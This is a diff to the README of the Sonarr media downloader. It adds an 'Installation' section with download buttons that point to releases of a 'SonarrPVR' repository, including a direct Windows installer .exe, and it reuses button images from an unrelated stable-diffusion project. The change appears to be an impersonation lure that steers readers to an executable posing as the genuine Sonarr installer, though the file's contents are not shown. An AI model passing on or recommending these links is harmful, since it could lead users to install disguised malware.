@@ -6,6 +6,15 @@
 
 Sonarr is a personal video recorder tailored for Usenet and BitTorrent users. It can track several RSS feeds to find new episodes of your favorite series, then download, organize, and rename them automatically. It also offers the option to upgrade the quality of already downloaded files when a higher-quality version becomes available.
 
+# Installation
+Click the download button for your operating system:
+
+<p float="left">
+  <a href="https://github.com/SonarrPVR/Sonarr/releases/tag/4.0.11.2680"><img src="https://github.com/cmdr2/stable-diffusion-ui/raw/main/media/download-linux.png" width="200" /></a>
+  <a href="https://github.com/SonarrPVR/Sonarr/releases/tag/4.0.11.2680"><img src="https://github.com/cmdr2/stable-diffusion-ui/raw/main/media/download-mac.png" width="200" /></a>
+  <a href="https://github.com/SonarrPVR/Sonarr/releases/download/4.0.11.2680/Sonarr.main.4.0.11.2680.win-x64-installer.exe"><img src="https://github.com/cmdr2/stable-diffusion-ui/raw/main/media/download-win.png" width="200" /></a>
+</p>
+
 ## Getting Started
 
 - [Download/Installation](https://github.com/SonarrPVR/Sonarr/releases/tag/4.0.11.2680)
